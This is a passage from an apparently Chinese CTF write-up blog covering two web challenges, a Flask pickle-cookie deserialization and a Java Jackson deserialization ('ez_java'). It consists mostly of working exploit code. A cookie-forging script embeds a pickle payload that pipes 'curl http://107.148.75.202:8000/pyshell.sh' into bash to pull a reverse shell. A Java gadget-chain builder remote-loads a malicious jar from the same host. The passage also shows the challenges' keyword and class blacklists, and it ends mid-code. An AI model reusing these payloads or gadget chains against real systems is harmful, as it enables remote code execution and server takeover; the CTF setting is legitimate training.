-<span class="number">1</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    data = tob(data)</span><br><span class="line">    <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">        sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">            <span class="keyword">return</span> pickle.loads(base64.b64decode(msg))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    blacklist = [<span class="string">b&#x27;R&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>, <span class="string">b&#x27;eval&#x27;</span>, <span class="string">b&#x27;file&#x27;</span>, <span class="string">b&#x27;compile&#x27;</span>, <span class="string">b&#x27;open&#x27;</span>, <span class="string">b&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> data:</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># print(word)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_check</span>(<span class="params">key, secret=<span class="literal">None</span></span>):</span><br><span class="line">    a = request.cookies.get(key)</span><br><span class="line">    data = tob(request.cookies.get(key))</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">            sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">                res = base64.b64decode(msg)</span><br><span class="line">                <span class="keyword">if</span> waf(res):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.encode(enc) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode) <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">key, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">    value = request.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">        dec = cookie_decode(value, secret)</span><br><span class="line">        <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_is_encoded</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(data.startswith(tob(<span class="string">&#x27;!&#x27;</span>)) <span class="keyword">and</span> tob(<span class="string">&#x27;?&#x27;</span>) <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_lscmp</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">sum</span>(<span class="number">0</span> <span class="keyword">if</span> x == y <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)) <span class="keyword">and</span> <span class="built_in">len</span>(a) == <span class="built_in">len</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params">name, value, secret=<span class="literal">None</span>, **options</span>):</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        value = touni(cookie_encode((name, value), secret))</span><br><span class="line">        resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        resp.set_cookie(<span class="string">&quot;user&quot;</span>, value, max_age=<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&#x27;Secret key missing for non-string Cookie.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">4096</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Cookie value to long.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.decode(enc, err) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>) <span class="keyword">else</span> unicode(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>config&#x2F;secret_key.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_code = <span class="string">&quot;EnjoyThePlayTime123456&quot;</span></span><br></pre></td></tr></table></figure><p>分析一下, 是一个简单的pickle反序列化, cookie处存在反序列化点, 这里没法直接弹shell, 所以在vps上起一个http服务放python的反弹shell, 然后curl下来推到bash即可</p><p>稍微改一下, 写一个伪造cookie的脚本</p><p>exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret_key <span class="keyword">import</span> secret_code</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, render_template</span><br><span class="line"><span class="keyword">from</span> cookie <span class="keyword">import</span> set_cookie, cookie_check, touni, cookie_encode, cookie_decode, tob, cookie_is_encoded, _lscmp</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">cookie,key=<span class="string">&#x27;user&#x27;</span>, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">    value = cookie</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">        dec = cookie_decode(value, secret)</span><br><span class="line">        <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(S&#x27;curl http://107.148.75.202:8000/pyshell.sh | bash&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line">    code = opcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    res = code</span><br><span class="line">    cookie = touni(cookie_encode((<span class="string">&#x27;user&#x27;</span>, res), secret_code))</span><br><span class="line">    <span class="built_in">print</span>(cookie)</span><br><span class="line">    <span class="comment"># dec = cookie_decode(cookie, secret_code)</span></span><br><span class="line">    <span class="comment"># print(dec)</span></span><br><span class="line">    data_cookie = get_cookie(cookie, secret=secret_code)</span><br><span class="line"></span><br><span class="line">    data = tob(cookie)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">            sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(secret_code), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">                res = base64.b64decode(msg)</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data_cookie, <span class="built_in">bytes</span>):</span><br><span class="line">        a = pickle.loads(data_cookie)</span><br></pre></td></tr></table></figure><h2 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h2><p>拿到jar包, 首先拿到账号密码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240828125100773.png" alt="image-20240828125100773"></p><p>在UserController存在反序列化和文件上传, 有了账户密码才能访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: ycbjava-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/ycbjava/controler/UserControler.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserControler</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/user/index&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BeanDefinitionParserDelegate.INDEX_ATTRIBUTE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/user/ser&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">ser</span><span class="params">(<span class="meta">@RequestParam(&quot;ser&quot;)</span> String ser)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(ser);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        byteArrayOutputStream.write(decode);</span><br><span class="line">        <span class="type">MyObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/user/upload&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">handleFileUpload</span><span class="params">(MultipartFile file)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;../&quot;</span>) || fileName.contains(<span class="string">&quot;..\\&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> fileName.substring(index);</span><br><span class="line">            <span class="keyword">if</span> (suffix.equals(<span class="string">&quot;.jsp&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;/templates/&quot;</span> + fileName, <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line">            Files.write(path, bytes, <span class="keyword">new</span> <span class="title class_">OpenOption</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File upload success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下有shiro的依赖, 先是打了cb链, shiro反序列化,  无果</p><p>过滤了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = &#123;<span class="string">&quot;java.lang.Runtime&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <span class="string">&quot;java.security.SignedObject&quot;</span>, <span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>, <span class="string">&quot;org.apache.commons.beanutils&quot;</span>, <span class="string">&quot;org.apache.commons.collections&quot;</span>, <span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试了utf-8 overlang bypass也不行</p><p>看来它禁掉的类是用不了了</p><p>在<code>com.example.ycbjava.bean.User#getGift</code>方法中向urlclasspath中添加数据, 结合之前的文件上传, 思路一下就有了:</p><blockquote><p>首先上传一个jar包, 然后触发getGift把&#x2F;templates&#x2F;下的jar包导入<code>urlclasspath</code>, 再次反序列化就能加载原本不存在的类</p></blockquote><p>getGift明显是一个getter, 但是禁的太多了, cb什么的都不能用, 没办法调用任意getter</p><p>思来想去我把目光放在了jackson上, 这里jackson版本2.13.5, 比较高, 之前没接触过jackson反序列化, 本来以为这是没什么链能用</p><p>抱着学习的态度看了下jackson反序列化, </p><p><code>POJONode</code>这个类的toString(父类实现)可以遍历调用getter, 那么问题就转化到调用toString了</p><p>唯一熟悉的<code>javax.management.BadAttributeValueExpException</code>调用toString被禁</p><p>找了很久直到看见这篇:</p><p><a href="https://www.aiwin.fun/index.php/archives/4420/">https://www.aiwin.fun/index.php/archives/4420/</a></p><p>搬过来直接用</p><p>插入urlclassspath的地方有一个小小的过滤</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240828130407747.png" alt="image-20240828130407747"></p><p>在http或file前面加上jar:即可绕过</p><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:file:/D:/tmp/123.jar!/</span><br></pre></td></tr></table></figure><p>末尾的<code>!/</code>是必不可少的</p><p>但是这题最坑的地方在于, 上传的jar包根本用不了(或许我的姿势不对), 所以我们使用<code>jar:http://</code>远程加载类</p><p>exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.ycbjava.bean.User;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.Test.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jacksonHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        CtClass ctClass= ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        CtMethod writeReplace=ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="type">Evil</span> <span class="variable">evil</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;jar:http://107.148.75.202:8000/123.jar!/&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(evil);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; innerClass=Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);</span><br><span class="line">        Map map1= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        Map map2= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        Map map3= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        Map map4= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        map3.put(pojoNode2,<span class="string">&quot;222&quot;</span>);</span><br><span class="line">        map4.put(pojoNode2,<span class="string">&quot;111&quot;</span>);<span class="comment">//pojoNode2中是原本不存在的恶意类, 先将pojoNode2放进去,保证执行了getGift再执行恶意类的toString方法, 否则加载不到恶意类</span></span><br><span class="line">        map1.put(pojoNode,<span class="string">&quot;444&quot;</span>);</span><br><span class="line">        map2.put(pojoNode,<span class="string">&quot;333&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field field=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map1,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field1=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(map2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field3=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map3,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field4=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map4,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(map1,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map2,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map3,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map4,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setHashMapValueToNull(map1, pojoNode);<span class="comment">//为了在HashMap.put时候就触发,通过反射变成null</span></span><br><span class="line">        setHashMapValueToNull(map2, pojoNode);</span><br><span class="line">        setHashMapValueToNull(map3, pojoNode2);</span><br><span class="line">        setHashMapValueToNull(map4, pojoNode2);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Object <span class="title function_">createWithoutConstructor</span> <span class="params">(Class classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithoutConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setHashMapValueToNull</span><span class="params">(Map map, Object key)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tableField</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        tableField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] table = (Object[]) tableField.get(map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object node : table) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node == <span class="literal">null</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; nodeClass = node.getClass();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> nodeClass.getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">            keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">k</span> <span class="operator">=</span> keyField.get(node);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k != <span class="literal">null</span> &amp;&amp; k.equals(key)) &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">valueField</span> <span class="operator">=</span> nodeClass.getDeclaredField(<span 